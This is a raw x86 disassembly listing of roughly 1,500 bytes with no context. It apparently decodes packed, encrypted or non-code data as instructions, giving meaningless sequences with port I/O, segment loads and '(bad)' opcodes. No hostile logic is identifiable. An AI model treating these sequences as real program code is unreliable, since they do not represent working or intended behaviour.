  403f01:	7c 35                	jl     0x403f38
  403f03:	d1 2d 8c 6a ef b0    	shrl   $1,0xb0ef6a8c
  403f09:	67 3f                	addr16 aas
  403f0b:	36 c2 26 3a          	ss ret $0x3a26
  403f0f:	36 80 cd c6          	ss or  $0xc6,%ch
  403f13:	99                   	cltd
  403f14:	97                   	xchg   %eax,%edi
  403f15:	e7 fe                	out    %eax,$0xfe
  403f17:	6e                   	outsb  %ds:(%esi),(%dx)
  403f18:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  403f1c:	02 66 50             	add    0x50(%esi),%ah
  403f1f:	66 02 64 52 66       	data16 add 0x66(%edx,%edx,2),%ah
  403f24:	68 64 7a 99 1d       	push   $0x1d997a64
  403f29:	6c                   	insb   (%dx),%es:(%edi)
  403f2a:	d2 5f 54             	rcrb   %cl,0x54(%edi)
  403f2d:	64 3a ef             	fs cmp %bh,%ch
  403f30:	2d 80 bb a0 51       	sub    $0x51a0bb80,%eax
  403f35:	58                   	pop    %eax
  403f36:	3a 66 02             	cmp    0x2(%esi),%ah
  403f39:	64 b7 23             	fs mov $0x23,%bh
  403f3c:	80 34 c5 13 88 37 c5 	xorb   $0x13,-0x3ac877ed(,%eax,8)
  403f43:	13 
  403f44:	8c 8c 94 5a 68 64 c5 	mov    %cs,-0x3a9b97a6(%esp,%edx,4)
  403f4b:	13 8c 8c 70 5d 68 64 	adc    0x64685d70(%esp,%ecx,4),%ecx
  403f52:	69 8e 90 5f 3a 66 59 	imul   $0x8d7aa459,0x663a5f90(%esi),%ecx
  403f59:	a4 7a 8d 
  403f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  403f5d:	e5 cc                	in     $0xcc,%eax
  403f5f:	41                   	inc    %ecx
  403f60:	21 64 3a 39          	and    %esp,0x39(%edx,%edi,1)
  403f64:	36 3f                	ss aas
  403f66:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403f68:	3d ed df e7 84       	cmp    $0x84e7dfed,%eax
  403f6d:	40                   	inc    %eax
  403f6e:	38 66 68             	cmp    %ah,0x68(%esi)
  403f71:	37                   	aaa
  403f72:	6c                   	insb   (%dx),%es:(%edi)
  403f73:	31 d6                	xor    %edx,%esi
  403f75:	01 7f 3f             	add    %edi,0x3f(%edi)
  403f78:	7a dc                	jp     0x403f56
  403f7a:	e1 7b                	loope  0x403ff7
  403f7c:	68 64 cd 80 e1       	push   $0xe180cd64
  403f81:	e1 d6                	loope  0x403f59
  403f83:	9b                   	fwait
  403f84:	97                   	xchg   %eax,%edi
  403f85:	9b                   	fwait
  403f86:	b3 a0                	mov    $0xa0,%bl
  403f88:	e9 61 3a c7 2a       	jmp    0x2b0779ee
  403f8d:	64 90                	fs nop
  403f8f:	66 68 64 b7          	pushw  $0xb764
  403f93:	7b 7b                	jnp    0x404010
  403f95:	a8 78                	test   $0x78,%al
  403f97:	66 d0 dd             	data16 rcr $1,%ch
  403f9a:	51                   	push   %ecx
  403f9b:	66 68 93 dc          	pushw  $0xdc93
  403f9f:	ef                   	out    %eax,(%dx)
  403fa0:	ed                   	in     (%dx),%eax
  403fa1:	8c c7                	mov    %es,%edi
  403fa3:	99                   	cltd
  403fa4:	97                   	xchg   %eax,%edi
  403fa5:	ed                   	in     (%dx),%eax
  403fa6:	fc                   	cld
  403fa7:	8e 88 5a 3a 66 d2    	mov    -0x2d99c5a6(%eax),%cs
  403fad:	b7 77                	mov    $0x77,%bh
  403faf:	04 78                	add    $0x78,%al
  403fb1:	35 b3 a7 9f 8e       	xor    $0x8e9fa7b3,%eax
  403fb6:	fb                   	sti
  403fb7:	9c                   	pushf
  403fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  403fb9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403fba:	c3                   	ret
  403fbb:	79 41                	jns    0x403ffe
  403fbd:	ae                   	scas   %es:(%edi),%al
  403fbe:	b3 b6                	mov    $0xb6,%bl
  403fc0:	31 ed                	xor    %ebp,%ebp
  403fc2:	fd                   	std
  403fc3:	e5 af                	in     $0xaf,%eax
  403fc5:	25 b3 9c e0 f1       	and    $0xf1e09cb3,%eax
  403fca:	c5 98 97 9b fc 23    	lds    0x23fc9b97(%eax),%ebx
  403fd0:	97                   	xchg   %eax,%edi
  403fd1:	65 d1 48 80          	rorl   $1,%gs:-0x80(%eax)
  403fd5:	d7                   	xlat   %ds:(%ebx)
  403fd6:	04 66                	add    $0x66,%al
  403fd8:	68 6b 8c 1b 97       	push   $0x971b8c6b
  403fdd:	de e9                	fsubrp %st,%st(1)
  403fdf:	2b 0a                	sub    (%edx),%ecx
  403fe1:	74 6b                	je     0x40404e
  403fe3:	ef                   	out    %eax,(%dx)
  403fe4:	a9 93 d0 a7 92       	test   $0x92a7d093,%eax
  403fe9:	63 fb                	arpl   %edi,%ebx
  403feb:	9f                   	lahf
  403fec:	77 4d                	ja     0x40403b
  403fee:	f0 ef                	lock out %eax,(%dx)
  403ff0:	b8 3d b3 a4 eb       	mov    $0xeba4b33d,%eax
  403ff5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403ff6:	5b                   	pop    %ebx
  403ff7:	ee                   	out    %al,(%dx)
  403ff8:	fc                   	cld
  403ff9:	59                   	pop    %ecx
  403ffa:	c5 98 97 9b ba 23    	lds    0x23ba9b97(%eax),%ebx
  404000:	97                   	xchg   %eax,%edi
  404001:	65 b0 23             	gs mov $0x23,%al
  404004:	97                   	xchg   %eax,%edi
  404005:	58                   	pop    %eax
  404006:	32 10                	xor    (%eax),%dl
  404008:	a3 a2 bf 61 97       	mov    %eax,0x9761bfa2
  40400d:	9b                   	fwait
  40400e:	c5 66 80             	lds    -0x80(%esi),%esp
  404011:	13 04 66             	adc    (%esi,%eiz,2),%eax
  404014:	68 ed f8 90 aa       	push   $0xaa90f8ed
  404019:	65 4f                	gs dec %edi
  40401b:	68 ae e1 3f 99       	push   $0x993fe1ae
  404020:	97                   	xchg   %eax,%edi
  404021:	9b                   	fwait
  404022:	09 a0 ed 62 c5 99    	or     %esp,-0x663a9d13(%eax)
  404028:	97                   	xchg   %eax,%edi
  404029:	56                   	push   %esi
  40402a:	bb 90 7c 2d 3a       	mov    $0x3a2d7c90,%ebx
  40402f:	66 e5 e1             	in     $0xe1,%ax
  404032:	c5 98 97 9b 6a 0e    	lds    0xe6a9b97(%eax),%ebx
  404038:	e8 f4 78 66 00       	call   0xa6b931
  40403d:	6d                   	insl   (%dx),%es:(%edi)
  40403e:	f6 24 68             	mulb   (%eax,%ebp,2)
  404041:	e9 bf 9d 95 9b       	jmp    0x9bd5de05
  404046:	c5 36                	lds    (%esi),%esi
  404048:	80 33 04             	xorb   $0x4,(%ebx)
  40404b:	66 68 0e 3a          	pushw  $0x3a0e
  40404f:	0c 68                	or     $0x68,%al
  404051:	0e                   	push   %cs
  404052:	38 0c 68             	cmp    %cl,(%eax,%ebp,2)
  404055:	0e                   	push   %cs
  404056:	3a 0e                	cmp    (%esi),%cl
  404058:	68 64 3a 26 e5       	push   $0xe5263a64
  40405d:	e1 c1                	loope  0x404020
  40405f:	9b                   	fwait
  404060:	97                   	xchg   %eax,%edi
  404061:	9b                   	fwait
  404062:	6a 8e                	push   $0xffffff8e
  404064:	68 5f 3a 66 e1       	push   $0xe1663a5f
  404069:	e1 ce                	loope  0x404039
  40406b:	9b                   	fwait
  40406c:	97                   	xchg   %eax,%edi
  40406d:	9b                   	fwait
  40406e:	82 72 02 64          	xorb   $0x64,0x2(%edx)
  404072:	3a 91 8e ed bf 82    	cmp    -0x7d401272(%ecx),%dl
  404078:	95                   	xchg   %eax,%ebp
  404079:	9b                   	fwait
  40407a:	c5 ef ae             	(bad)
  40407d:	9b                   	fwait
  40407e:	4f                   	dec    %edi
  40407f:	6e                   	outsb  %ds:(%esi),(%dx)
  404080:	d0 70 83             	shlb   $1,-0x7d(%eax)
  404083:	24 68                	and    $0x68,%al
  404085:	34 d2                	xor    $0xd2,%al
  404087:	7f 56                	jg     0x4040df
  404089:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  40408d:	e9 bf 96 95 9b       	jmp    0x9bd5d751
  404092:	c5 36                	lds    (%esi),%esi
  404094:	00 65 20             	add    %ah,0x20(%ebp)
  404097:	66 68 0c be          	pushw  $0xbe0c
  40409b:	cc                   	int3
  40409c:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  4040a0:	9c                   	pushf
  4040a1:	99                   	cltd
  4040a2:	c5 99 80 2b 01 66    	lds    0x66012b80(%ecx),%ebx
  4040a8:	68 ed ca 91 8e       	push   $0x8e91caed
  4040ad:	ed                   	in     (%dx),%eax
  4040ae:	bf 86 95 9b c5       	mov    $0xc59b9586,%edi
  4040b3:	ef                   	out    %eax,(%dx)
  4040b4:	ae                   	scas   %es:(%edi),%al
  4040b5:	9b                   	fwait
  4040b6:	8f                   	(bad)
  4040b7:	92                   	xchg   %eax,%edx
  4040b8:	95                   	xchg   %eax,%ebp
  4040b9:	9b                   	fwait
  4040ba:	c5 8e b4 5d 3a 66    	lds    0x663a5db4(%esi),%ecx
  4040c0:	97                   	xchg   %eax,%edi
  4040c1:	61                   	popa
  4040c2:	3a c7                	cmp    %bh,%al
  4040c4:	2a 64 69 0e          	sub    0xe(%ecx,%ebp,2),%ah
  4040c8:	99                   	cltd
  4040c9:	af                   	scas   %es:(%edi),%eax
  4040ca:	78 66                	js     0x404132
  4040cc:	e5 e1                	in     $0xe1,%eax
  4040ce:	c5 98 97 9b 6a 8e    	lds    -0x71956469(%eax),%ebx
  4040d4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4040d5:	59                   	pop    %ecx
  4040d6:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  4040d9:	e1 c1                	loope  0x40409c
  4040db:	9b                   	fwait
  4040dc:	97                   	xchg   %eax,%edi
  4040dd:	9b                   	fwait
  4040de:	6a 0e                	push   $0xe
  4040e0:	98                   	cwtl
  4040e1:	af                   	scas   %es:(%edi),%eax
  4040e2:	78 66                	js     0x40414a
  4040e4:	e5 e1                	in     $0xe1,%eax
  4040e6:	c5 98 97 9b 6a 0e    	lds    0xe6a9b97(%eax),%ebx
  4040ec:	68 64 3a e6 80       	push   $0x80e63a64
  4040f1:	37                   	aaa
  4040f2:	3a 66 68             	cmp    0x68(%esi),%ah
  4040f5:	dc 32                	fdivl  (%edx)
  4040f7:	32 68 64             	xor    0x64(%eax),%ch
  4040fa:	cd 80                	int    $0x80
  4040fc:	e1 e1                	loope  0x4040df
  4040fe:	e6 9b                	out    %al,$0x9b
  404100:	97                   	xchg   %eax,%edi
  404101:	9b                   	fwait
  404102:	b3 a0                	mov    $0xa0,%bl
  404104:	97                   	xchg   %eax,%edi
  404105:	61                   	popa
  404106:	3a c7                	cmp    %bh,%al
  404108:	2a 64 52 b1          	sub    -0x4f(%edx,%edx,2),%ah
  40410c:	a3 26 3a 0e 89       	mov    %eax,0x890e3a26
  404111:	af                   	scas   %es:(%edi),%eax
  404112:	78 66                	js     0x40417a
  404114:	e5 e1                	in     $0xe1,%eax
  404116:	c5 98 97 9b 6a 0e    	lds    0xe6a9b97(%eax),%ebx
  40411c:	68 64 3a e6 80       	push   $0x80e63a64
  404121:	47                   	inc    %edi
  404122:	3a 66 68             	cmp    0x68(%esi),%ah
  404125:	37                   	aaa
  404126:	52                   	push   %edx
  404127:	e6 a3                	out    %al,$0xa3
  404129:	26 3a 0e             	cmp    %es:(%esi),%cl
  40412c:	f9                   	stc
  40412d:	af                   	scas   %es:(%edi),%eax
  40412e:	78 66                	js     0x404196
  404130:	00 66 3a             	add    %ah,0x3a(%esi)
  404133:	66 e8 8c 34          	callw  0x75c3
  404137:	66 68 64 b9          	pushw  $0xb964
  40413b:	a2 3c ed ca 57       	mov    %al,0x57caed3c
  404140:	98                   	cwtl
  404141:	ed                   	in     (%dx),%eax
  404142:	fc                   	cld
  404143:	39 36                	cmp    %esi,(%esi)
  404145:	3f                   	aas
  404146:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404148:	3d ed df 37 38       	cmp    $0x3837dfed,%eax
  40414d:	37                   	aaa
  40414e:	6c                   	insb   (%dx),%es:(%edi)
  40414f:	31 e3                	xor    %esp,%ebx
  404151:	11 2e                	adc    %ebp,(%esi)
  404153:	d9 5f 24             	fstps  0x24(%edi)
  404156:	a0 1a e9 a3 64       	mov    0x64a3e91a,%al
  40415b:	26 68 64 c5 63 68    	es push $0x6863c564
  404161:	c5 78 66             	lds    0x66(%eax),%edi
  404164:	e1 9c                	loope  0x404102
  404166:	3b 9e e1 a3 b9 03    	cmp    0x3b9a3e1(%esi),%ebx
  40416c:	94                   	xchg   %eax,%esp
  40416d:	64 b7 23             	fs mov $0x23,%bh
  404170:	90                   	nop
  404171:	34 b7                	xor    $0xb7,%al
  404173:	23 94 34 50 66 00 5b 	and    0x5b006650(%esp,%esi,1),%edx
  40417a:	3a 69 68             	cmp    0x68(%ecx),%ch
  40417d:	0e                   	push   %cs
  40417e:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  404181:	0e                   	push   %cs
  404182:	3a 99 1d 68 c5 13    	cmp    0x13c5681d(%ecx),%bl
  404188:	60                   	pusha
  404189:	8c 08                	mov    %cs,(%eax)
  40418b:	5a                   	pop    %edx
  40418c:	68 64 b3 97 eb       	push   $0xeb97b364
  404191:	ac                   	lods   %ds:(%esi),%al
  404192:	c5 26                	lds    (%esi),%esp
  404194:	e8 58 3b 66 1d       	call   0x1da67cf1
  404199:	9d                   	popf
  40419a:	b3 23                	mov    $0x23,%bl
  40419c:	90                   	nop
  40419d:	9b                   	fwait
  40419e:	4f                   	dec    %edi
  40419f:	9e                   	sahf
  4041a0:	3e 0e                	ds push %cs
  4041a2:	3b 0c 68             	cmp    (%eax,%ebp,2),%ecx
  4041a5:	9b                   	fwait
  4041a6:	4f                   	dec    %edi
  4041a7:	76 97                	jbe    0x404140
  4041a9:	11 c6                	adc    %eax,%esi
  4041ab:	8e 28                	mov    (%eax),%gs
  4041ad:	58                   	pop    %eax
  4041ae:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  4041b1:	9c                   	pushf
  4041b2:	3b 9e e1 a3 c5 13    	cmp    0x13c5a3e1(%esi),%ebx
  4041b8:	94                   	xchg   %eax,%esp
  4041b9:	8c 34 5a             	mov    %?,(%edx,%ebx,2)
  4041bc:	68 64 65 38 33       	push   $0x33386564
  4041c1:	ad                   	lods   %ds:(%esi),%eax
  4041c2:	f9                   	stc
  4041c3:	33 e1                	xor    %ecx,%esp
  4041c5:	81 6d d9 4a 2d 8b 29 	subl   $0x298b2d4a,-0x27(%ebp)
  4041cc:	e1 9c                	loope  0x40416a
  4041ce:	13 9e e1 a3 c5 13    	adc    0x13c5a3e1(%esi),%ebx
  4041d4:	7c 8c                	jl     0x404162
  4041d6:	10 5c 68 64          	adc    %bl,0x64(%eax,%ebp,2)
  4041da:	50                   	push   %eax
  4041db:	67 38 9b 4f 72       	cmp    %bl,0x724f(%bp,%di)
  4041e0:	97                   	xchg   %eax,%edi
  4041e1:	11 2a                	adc    %ebp,(%edx)
  4041e3:	99                   	cltd
  4041e4:	1d 68 c5 13 60       	sbb    $0x6013c568,%eax
  4041e9:	8c 0b                	mov    %cs,(%ebx)
  4041eb:	66 68 64 b9          	pushw  $0xb964
  4041ef:	a2 70 3b 67 a5       	mov    %al,0xa5673b70
  4041f4:	3d ed df 31 d7       	cmp    $0xd731dfed,%eax
  4041f9:	b4 6b                	mov    $0x6b,%ah
  4041fb:	bc 15 ed c2 67       	mov    $0x67c2ed15,%esp
  404200:	90                   	nop
  404201:	ed                   	in     (%dx),%eax
  404202:	fd                   	std
  404203:	0c 6c                	or     $0x6c,%al
  404205:	0e                   	push   %cs
  404206:	3e eb 2d             	ds jmp 0x404236
  404209:	70 6a                	jo     0x404275
  40420b:	99                   	cltd
  40420c:	1d 74 c5 13 64       	sbb    $0x6413c574,%eax
  404211:	9b                   	fwait
  404212:	4f                   	dec    %edi
  404213:	6e                   	outsb  %ds:(%esi),(%dx)
  404214:	80 62 3a 66          	andb   $0x66,0x3a(%edx)
  404218:	68 e7 fe 7e 37       	push   $0x377efee7
  40421d:	39 f9                	cmp    %edi,%ecx
  40421f:	33 e1                	xor    %ecx,%esp
  404221:	81 b9 8a 64 33 85 88 	cmpl   $0x6aff0788,-0x7acc9b76(%ecx)
  404228:	07 ff 6a 
  40422b:	e7 9f                	out    %eax,$0x9f
  40422d:	7a 7c                	jp     0x4042ab
  40422f:	66 68 ed c2          	pushw  $0xc2ed
  404233:	91                   	xchg   %eax,%ecx
  404234:	8f                   	(bad)
  404235:	ed                   	in     (%dx),%eax
  404236:	7f 92                	jg     0x4041ca
  404238:	e1 a3                	loope  0x4041dd
  40423a:	b7 23                	mov    $0x23,%bh
  40423c:	90                   	nop
  40423d:	34 b7                	xor    $0xb7,%al
  40423f:	23 94 34 50 66 00 62 	and    0x62006650(%esp,%esi,1),%edx
  404246:	3a 64 68 0e          	cmp    0xe(%eax,%ebp,2),%ah
  40424a:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  40424d:	0e                   	push   %cs
  40424e:	3a 99 1d 68 c5 13    	cmp    0x13c5681d(%ecx),%bl
  404254:	60                   	pusha
  404255:	8c 5c 5d 68          	mov    %ds,0x68(%ebp,%ebx,2)
  404259:	64 33 a6 1c 60 0b a6 	xor    %fs:-0x59f49fe4(%esi),%esp
  404260:	83 53 c5 13          	adcl   $0x13,-0x3b(%ebx)
  404264:	70 9b                	jo     0x404201
  404266:	4f                   	dec    %edi
  404267:	72 97                	jb     0x404200
  404269:	11 26                	adc    %esp,(%esi)
  40426b:	0c 68                	or     $0x68,%al
  40426d:	9b                   	fwait
  40426e:	4f                   	dec    %edi
  40426f:	76 97                	jbe    0x404208
  404271:	11 c6                	adc    %eax,%esi
  404273:	8e 10                	mov    (%eax),%ss
  404275:	5f                   	pop    %edi
  404276:	3a 66 61             	cmp    0x61(%esi),%ah
  404279:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40427a:	4e                   	dec    %esi
  40427b:	6a 97                	push   $0xffffff97
  40427d:	11 c6                	adc    %eax,%esi
  40427f:	8e 20                	mov    (%eax),%fs
  404281:	5f                   	pop    %edi
  404282:	3a 66 59             	cmp    0x59(%esi),%ah
  404285:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404286:	d1 77 97             	shll   $1,-0x69(%edi)
  404289:	11 c6                	adc    %eax,%esi
  40428b:	8e 54 5f 3a          	mov    0x3a(%edi,%ebx,2),%ss
  40428f:	66 e1 9c             	data16 loope 0x40422e
  404292:	0b 9e e1 a3 0b a6    	or     -0x59f45c1f(%esi),%ebx
  404298:	28 3b                	sub    %bh,(%ebx)
  40429a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40429c:	3d ed df e5 84       	cmp    $0x84e5dfed,%eax
  4042a1:	74 6c                	je     0x40430f
  4042a3:	31 e3                	xor    %esp,%ebx
  4042a5:	11 2e                	adc    %ebp,(%esi)
  4042a7:	ed                   	in     (%dx),%eax
  4042a8:	2d 7c 5c ef 2d       	sub    $0x2def5c7c,%eax
  4042ad:	7c 85                	jl     0x404234
  4042af:	6a 5e                	push   $0x5e
  4042b1:	5e                   	pop    %esi
  4042b2:	12 ef                	adc    %bh,%ch
  4042b4:	90                   	nop
  4042b5:	55                   	push   %ebp
  4042b6:	c2 ef af             	ret    $0xafef
  4042b9:	a2 3c 66 e9 8b       	mov    %al,0x8be9663c
  4042be:	71 5b                	jno    0x40431b
  4042c0:	68 64 b7 23 94       	push   $0x9423b764
  4042c5:	34 52                	xor    $0x52,%al
  4042c7:	7f 68                	jg     0x404331
  4042c9:	66 3a 0c 68          	data16 cmp (%eax,%ebp,2),%cl
  4042cd:	9b                   	fwait
  4042ce:	4f                   	dec    %edi
  4042cf:	6a 97                	push   $0xffffff97
  4042d1:	11 32                	adc    %esi,(%edx)
  4042d3:	8e 68 5f             	mov    0x5f(%eax),%gs
  4042d6:	3a 66 61             	cmp    0x61(%esi),%ah
  4042d9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042da:	4e                   	dec    %esi
  4042db:	62 59 a4             	bound  %ebx,-0x5c(%ecx)
  4042de:	d1 5d e5             	rcrl   $1,-0x1b(%ebp)
  4042e1:	21 22                	and    %esp,(%edx)
  4042e3:	36 3e 0e             	ss ds push %cs
  4042e6:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4042e9:	9b                   	fwait
  4042ea:	4f                   	dec    %edi
  4042eb:	76 97                	jbe    0x404284
  4042ed:	11 c6                	adc    %eax,%esi
  4042ef:	8e 98 5e 3a 66 61    	mov    0x61663a5e(%eax),%ds
  4042f5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042f6:	4e                   	dec    %esi
  4042f7:	6a 97                	push   $0xffffff97
  4042f9:	11 c6                	adc    %eax,%esi
  4042fb:	8e a4 5e 3a 66 59 a4 	mov    -0x5ba699c6(%esi,%ebx,2),%fs
  404302:	d1 71 97             	shll   $1,-0x69(%ecx)
  404305:	11 c6                	adc    %eax,%esi
  404307:	8e a8 5e 3a 66 67    	mov    0x67663a5e(%eax),%gs
  40430d:	d3 7f 7e             	sarl   %cl,0x7e(%edi)
  404310:	83 6d b3 9e          	subl   $0xffffff9e,-0x4d(%ebp)
  404314:	9f                   	lahf
  404315:	83 b3 23 98 ed fd 39 	xorl   $0x39,-0x21267dd(%ebx)
  40431c:	36 ad                	lods   %ss:(%esi),%eax
  40431e:	f9                   	stc
  40431f:	33 e1                	xor    %ecx,%esp
  404321:	81 b9 8a 64 32 6d d9 	cmpl   $0x8b2498d9,0x6d32648a(%ecx)
  404328:	98 24 8b 
  40432b:	42                   	inc    %edx
  40432c:	d0 07                	rolb   $1,(%edi)
  40432e:	09 66 68             	or     %esp,0x68(%esi)
  404331:	93                   	xchg   %eax,%ebx
  404332:	dd ef                	fucomp %st(7)
  404334:	2d 9c b3 a1 eb       	sub    $0xeba1b39c,%eax
  404339:	59                   	pop    %ecx
  40433a:	b2 a2                	mov    $0xa2,%dl
  40433c:	2a 64 3a 12          	sub    0x12(%edx,%edi,1),%ah
  404340:	4b                   	dec    %ebx
  404341:	8c 20                	mov    %fs,(%eax)
  404343:	51                   	push   %ecx
  404344:	68 64 6a 8e dc       	push   $0xdc8e6a64
  404349:	5d                   	pop    %ebp
  40434a:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  40434d:	21 ce                	and    %ecx,%esi
  40434f:	ef                   	out    %eax,(%dx)
  404350:	90                   	nop
  404351:	65 c2 ef af          	gs ret $0xafef
  404355:	c5 b2 a2 2a 64 03    	lds    0x3642aa2(%edx),%esi
  40435b:	23 9c 11 15 57 a8 24 	and    0x24a85715(%ecx,%edx,1),%ebx
  404362:	d1 58 02             	rcrl   $1,0x2(%eax)
  404365:	64 52                	fs push %edx
  404367:	a1 68 64 3a 0c       	mov    0xc3a6468,%eax
  40436c:	68 0e 3a 0c 68       	push   $0x680c3a0e
  404371:	0c 4f                	or     $0x4f,%al
  404373:	ad                   	lods   %ds:(%esi),%eax
  404374:	2a 64 d2 0b          	sub    0xb(%edx,%edx,8),%ah
  404378:	51                   	push   %ecx
  404379:	64 3a c5             	fs cmp %ch,%al
  40437c:	e0 a0                	loopne 0x40431e
  40437e:	78 66                	js     0x4043e6
  404380:	e1 9d                	loope  0x40431f
  404382:	13 9f e1 ab 33 a6    	adc    -0x59cc541f(%edi),%ebx
  404388:	1d 60 0b a6 83       	sbb    $0x83a60b60,%eax
  40438d:	70 c5                	jo     0x404354
  40438f:	53                   	push   %ebx
  404390:	e0 a0                	loopne 0x404332
  404392:	78 66                	js     0x4043fa
  404394:	80 3f 03             	cmpb   $0x3,(%edi)
  404397:	66 68 ed 7f          	pushw  $0x7fed
  40439b:	9a e1 9d 0b 9f e1 ab 	lcall  $0xabe1,$0x9f0b9de1
  4043a2:	65 38 a1 a7 83 b2 04 	cmp    %ah,%gs:0x4b283a7(%ecx)
  4043a9:	6c                   	insb   (%dx),%es:(%edi)
  4043aa:	1d e7 a9 c4 6c       	sbb    $0x6cc4a9e7,%eax
  4043af:	66 68 ef 7e          	pushw  $0x7eef
  4043b3:	42                   	inc    %edx
  4043b4:	6c                   	insb   (%dx),%es:(%edi)
  4043b5:	e9 2f 13 a3 26       	jmp    0x26e356e9
  4043ba:	3a ef                	cmp    %bh,%ch
  4043bc:	38 6c f9 33          	cmp    %ch,0x33(%ecx,%edi,8)
  4043c0:	e1 81                	loope  0x404343
  4043c2:	6b 35 3e 33 b1 13 60 	imul   $0x60,0x13b1333e,%esi
  4043c9:	df de                	(bad)
  4043cb:	29 5f 30             	sub    %ebx,0x30(%edi)
  4043ce:	b3 be                	mov    $0xbe,%bl
  4043d0:	9f                   	lahf
  4043d1:	87 b3 23 94 ed f9    	xchg   %esi,-0x6126bdd(%ebx)
  4043d7:	ed                   	in     (%dx),%eax
  4043d8:	15 68 d1 5e e8       	adc    $0xe85ed168,%eax
  4043dd:	58                   	pop    %eax
  4043de:	04 6b                	add    $0x6b,%al
  4043e0:	1d 55 b1 23 64       	sbb    $0x6423b155,%eax
  4043e5:	ed                   	in     (%dx),%eax
  4043e6:	c0 4f aa 36          	rorb   $0x36,-0x56(%edi)
  4043ea:	b3 94                	mov    $0x94,%bl
  4043ec:	69 a6 68 99 1d 74 d2 	imul   $0x645203d2,0x741d9968(%esi),%esp
  4043f3:	03 52 64 
  4043f6:	3a e5                	cmp    %ch,%ah
  4043f8:	ac                   	lods   %ds:(%esi),%al
  4043f9:	68 b3 9e 43 21       	push   $0x21439eb3
  4043fe:	36 ed                	ss in  (%dx),%eax
  404400:	3d 74 fc 62 6a       	cmp    $0x6a62fc74,%eax
  404405:	64 b3 be             	fs mov $0xbe,%bl
  404408:	41                   	inc    %ecx
  404409:	bc b3 a5 e1 9c       	mov    $0x9ce1a5b3,%esp
  40440e:	b9 a6 6a 8f 58       	mov    $0x588f6aa6,%ecx
  404413:	21 e8                	and    %ebp,%eax
  404415:	58                   	pop    %eax
  404416:	04 66                	add    $0x66,%al
  404418:	1d a6 b9 1b 64       	sbb    $0x641bb9a6,%eax
  40441d:	64 4e                	fs dec %esi
  40441f:	47                   	inc    %edi
  404420:	e8 58 04 66 1d       	call   0x1da6487d
  404425:	7f b3                	jg     0x4043da
  404427:	9e                   	sahf
  404428:	20 e4                	and    %ah,%ah
  40442a:	06                   	push   %es
  40442b:	60                   	pusha
  40442c:	62 11                	bound  %edx,(%ecx)
  40442e:	28 ed                	sub    %ch,%ch
  404430:	2d 74 fc 66 68       	sub    $0x6866fc74,%eax
  404435:	e5 c9                	in     $0xc9,%eax
  404437:	0d 3d 64 3a ed       	or     $0xed3a643d,%eax
  40443c:	2d 68 7a 8d 5c       	sub    $0x5c8d7a68,%eax
  404441:	ed                   	in     (%dx),%eax
  404442:	ca 65 2d             	lret   $0x2d65
  404445:	68 6a 8e d0 53       	push   $0x53d08e6a
  40444a:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  40444d:	a3 bb a5 d1 1b       	mov    %eax,0x1bd1a5bb
  404452:	3a 66 61             	cmp    0x61(%esi),%ah
  404455:	9b                   	fwait
  404456:	4e                   	dec    %esi
  404457:	7d e1                	jge    0x40443a
  404459:	94                   	xchg   %eax,%esp
  40445a:	39 23                	cmp    %esp,(%ebx)
  40445c:	64 34 c5             	fs xor $0xc5,%al
  40445f:	13 78 8c             	adc    -0x74(%eax),%edi
  404462:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404463:	53                   	push   %ebx
  404464:	68 64 b3 be 41       	push   $0x41beb364
  404469:	bc b3 a5 e3 21       	mov    $0x21e3a5b3,%esp
  40446e:	36 67 90             	ss addr16 nop
  404471:	8f                   	(bad)
  404472:	38 57 a8             	cmp    %dl,-0x58(%edi)
  404475:	3b 64 3d a1          	cmp    -0x5f(%ebp,%edi,1),%esp
  404479:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40447a:	6f                   	outsl  %ds:(%esi),(%dx)
  40447b:	ef                   	out    %eax,(%dx)
  40447c:	8d                   	lea    (bad),%esp
  40447d:	e7 d6                	out    %eax,$0xd6
  40447f:	76 3b                	jbe    0x4044bc
  404481:	32 6d ed             	xor    -0x13(%ebp),%ch
  404484:	35 6c 84 b3 2b       	xor    $0x2bb3846c,%eax
  404489:	d2 1f                	rcrb   %cl,(%edi)
  40448b:	e7 ae                	out    %eax,$0xae
  40448d:	b8 25 66 68 37       	mov    $0x37686625,%eax
  404492:	d2 0b                	rorb   %cl,(%ebx)
  404494:	5f                   	pop    %edi
  404495:	64 3a ef             	fs cmp %bh,%ch
  404498:	2d 9c b3 a1 b9       	sub    $0xb9a1b39c,%eax
  40449d:	83 b9 a1 60 33 50 26 	cmpl   $0x26,0x503360a1(%ecx)
  4044a4:	80 ff 0c             	cmp    $0xc,%bh
  4044a7:	66 68 ed 7f          	pushw  $0x7fed
  4044ab:	92                   	xchg   %eax,%edx
  4044ac:	e9 8a dc 69 68       	jmp    0x68aa213b
  4044b1:	64 0b 90 83 72 35 d0 	or     %fs:-0x2fca8d7d(%eax),%edx
  4044b8:	6c                   	insb   (%dx),%es:(%edi)
  4044b9:	57                   	push   %edi
  4044ba:	b9 96 19 6d fa       	mov    $0xfa6d1996,%ecx
  4044bf:	12 62 6b             	adc    0x6b(%edx),%ah
  4044c2:	8c 62 5b             	mov    %fs,0x5b(%edx)
  4044c5:	e7 ca                	out    %eax,$0xca
  4044c7:	17                   	pop    %ss
  4044c8:	e0 60                	loopne 0x40452a
  4044ca:	09 20                	or     %esp,(%eax)
  4044cc:	53                   	push   %ebx
